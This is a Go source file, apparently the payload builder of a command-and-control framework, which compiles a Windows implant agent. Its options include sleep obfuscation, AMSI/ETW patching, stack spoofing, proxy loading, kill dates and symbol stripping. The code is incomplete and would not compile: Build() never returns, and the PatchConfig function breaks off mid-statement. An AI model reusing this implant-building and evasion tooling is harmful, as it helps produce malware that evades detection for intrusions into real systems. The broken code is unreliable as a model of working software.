package Builder

import (
	LSCommon "AllSecure/ListeningServer/Common"
	TSCommon "AllSecure/TeamServer/Common"
	"AllSecure/TeamServer/Common/Packer"
	"AllSecure/TeamServer/Common/win32"
	"bytes"
	"errors"
	"log"
	"os"
	"os/exec"
	"strconv"
)

const (
	PayloadDir  = "Payloads"
	PayloadName = "Agent"
)

const (
	FILETYPE_WINDOWS_EXE            = 1
	FILETYPE_WINDOWS_SERVICE_EXE    = 2
	FILETYPE_WINDOWS_DLL            = 3
	FILETYPE_WINDOWS_REFLECTIVE_DLL = 4
	FILETYPE_WINDOWS_RAW_BINARY     = 5
)

const (
	SLEEPOBF_NO_OBF  = 0
	SLEEPOBF_EKKO    = 1
	SLEEPOBF_ZILEAN  = 2
	SLEEPOBF_FOLIAGE = 3
)

const (
	SLEEPOBF_BYPASS_NONE   = 0
	SLEEPOBF_BYPASS_JMPRAX = 1
	SLEEPOBF_BYPASS_JMPRBX = 2
)

const (
	PROXYLOADING_NONE             = 0
	PROXYLOADING_RTLREGISTERWAIT  = 1
	PROXYLOADING_RTLCREATETIMER   = 2
	PROXYLOADING_RTLQUEUEWORKITEM = 3
)

const (
	AMSIETW_PATCH_NONE   = 0
	AMSIETW_PATCH_HWBP   = 1
	AMSIETW_PATCH_MEMORY = 2
)

const (
	ARCHITECTURE_X64 = 1
	ARCHITECTURE_X86 = 2
)

type BuilderConfig struct {
	Compiler64 string
	Compiler86 string
	Nasm       string
	DebugDev   bool
	SendLogs   bool
}

type AgentBuilder struct {
	buildSource bool
	sourcePath  string
	silent      bool

	Payloads []string

	FilesCreated []string

	CompileDir     string
	FileExtenstion string

	FileType int
	ClientId string

	PatchBinary bool

	ProfileConfig struct {
		Original any

		MagicMzX64 string
		MagicMzX86 string

		ImageSizeX64 int
		ImageSizeX86 int

		ReplaceStringsX64 map[string]string
		ReplaceStringsX86 map[string]string
	}

	config struct {
		Arch           int
		ListenerType   int
		ListenerConfig any
		Config         map[string]any
	}

	ImplantOptions struct {
		Config []byte
	}

	compilerOptions struct {
		Config BuilderConfig

		SourceDirs  []string
		IncludeDirs []string
		CFlags      []string
		Defines     []string

		Main struct {
			Demon string
			Dll   string
			Exe   string
			Svc   string
		}
	}

	outputPath string
}

func NewImplantBuilder(config BuilderConfig, path string) *AgentBuilder {
	var builder = new(AgentBuilder)

	builder.sourcePath = path + "/" + PayloadDir + "/" + "Agent"
	builder.config.Arch = ARCHITECTURE_X64

	builder.compilerOptions.SourceDirs = []string{
		"src/agent",
		"src/Crypt",
		"src/cstdreplacement",
		"src/Enumeration",
		"src/Helpers",
		"src/Http",
		"src/Package",
	}
	builder.compilerOptions.IncludeDirs = []string{
		"include",
	}

	/*
	 * -Os                             Optimize for space rather than speed.
	 * -fno-asynchronous-unwind-tables Suppresses the generation of static unwind tables (as opposed to complete exception-handling code).
	 * -masm=intel                     Use the intel assembler dialect
	 * -fno-ident                      Ignore the #ident directive.
	 * -fpack-struct=<number>          Set initial maximum structure member alignment.
	 * -falign-functions=<number>      Align the start of functions to the next power-of-two greater than or equal to n, skipping up to m-1 bytes.
	 * -s                              Remove all symbols
	 * -ffunction-sections             Place each function into its own section.
	 * -fdata-sections                 Place each global or static variable into .data.variable_name, .rodata.variable_name or .bss.variable_name.
	 * -falign-jumps=<number>          Align branch targets to a power-of-two boundary.
	 * -w                              Suppress warnings.
	 * -falign-labels=<number>         Align all branch targets to a power-of-two boundary.
	 * -fPIC                           Generate position-independent code if possible (large mode).
	 * -Wl                             passes a comma-separated list of tokens as a space-separated list of arguments to the linker.
	 * -s                              Remove all symbol table and relocation information from the executable.
	 * --no-seh                        Image does not use SEH.
	 * --enable-stdcall-fixup          Link _sym to _sym@nn without warnings.
	 * --gc-sections                   Decides which input sections are used by examining symbols and relocations.
	 */

	/*

		C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\bin\Hostx86\x86\cl.exe //x86
		C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\bin\Hostx64\x64\cl.exe //x64
			C:\Strawberry\c\bin\x86_64-w64-mingw32-gcc.exe //x64

	*/

	if config.DebugDev {
		builder.compilerOptions.CFlags = []string{
			"",
			"-Os -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl, --no-seh --enable-stdcall-fixup --gc-sections",
		}
	} else {
		builder.compilerOptions.CFlags = []string{"",
			"-Os -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-s -ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl, -s, --no-seh --enable-stdcall-fixup --gc-sections",
		}
	}

	builder.compilerOptions.Main.Exe = "src/main/main.c"

	builder.compilerOptions.Config = config
	builder.PatchBinary = false

	return builder
}

func (ab *AgentBuilder) Build() bool {
	var (
		CompilerCommand string
	)

	ab.CompileDir = "C:\\Windows\\Temp\\" + PayloadDir + "\\"
	err := os.Mkdir(ab.CompileDir, os.ModePerm)
	if err != nil {
		log.Println("[error] attempting to create compile directory: ", err.Error())
		return false
	}

	if ab.outputPath == "" && ab.FileExtenstion != "" {
		ab.SetOutputPath(ab.CompileDir + PayloadName + ab.FileExtenstion)
	}

	Config, err := ab.PatchConfig()
	if err != nil {
		log.Println("[error] attempting to create patch config: ", err)
		return false
	}

}

func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
	var (
		AgentConfig  = Packer.Packer{}
		Sleep        int
		Jitter       int
		//Alloc        int
		//Execute      int
		//Spawn64      string
		//Spawn86      string
		//ObfTechnique int
		//ObfBypass    int
		//ProxyLoading = PROXYLOADING_NONE
		//StackSpoof   = win32.FALSE
		//Syscall      = win32.FALSE
		//AmsiPatch    = AMSIETW_PATCH_NONE
		err          error
	)

	if val, ok := ab.config.Config["Sleep"].(string); ok {
		Sleep, err = strconv.Atoi(val)
		if err != nil {
			log.Println("[error] failed to convert sleep value to int: ", err)
			return nil, err
		}
	}

	if val, ok := ab.config.Config["Jitter"].(string); ok {
		Jitter, err = strconv.Atoi(val)
		if err != nil {
			log.Println("[error] failed to convert jitter value to int: ", err)
			return nil, err
		}
		if Jitter < 0 || Jitter > 100 {
			return nil, errors.New("jitter value must be between 0 and 100")
		}
	} else {
		log.Println("[warning] jitter value not set, defaulting to 0")
		Jitter = 0
	}

	AgentConfig.AddInt(Sleep)
	AgentConfig.AddInt(Jitter)

	switch ab.config.ListenerType {
	case TSCommon.HTTP_SERVER:
		var (
			Config = ab.config.ListenerConfig.(*TSCommon.HTTPServerConfig)
			Port, err = strconv.Atoi(Config.Port)
		)
		if Port == 0 || err != nil {
			return nil, errors.New("invalid port")
		}
		AgentConfig.AddInt64(Config.KillDate)
		WorkingHours, err := 
	}

	return AgentConfig.GetBuffer(), nil
}

func (ab *AgentBuilder) SetOutputPath(path string) {
	ab.outputPath = path
}

func (ab *AgentBuilder) CompileCmd(cmd string) bool {
	var (
		CommandLine = exec.Command("cmd", "/c", cmd)
		stdout      bytes.Buffer
		stderr      bytes.Buffer
		err         error
	)

	CommandLine.Dir = ab.sourcePath
	CommandLine.Stdout = &stdout
	CommandLine.Stderr = &stderr

	err = CommandLine.Run()
	if err != nil {
		log.Println("[error] failed to compile agent: ", err)
		return false
	}
	return true
}
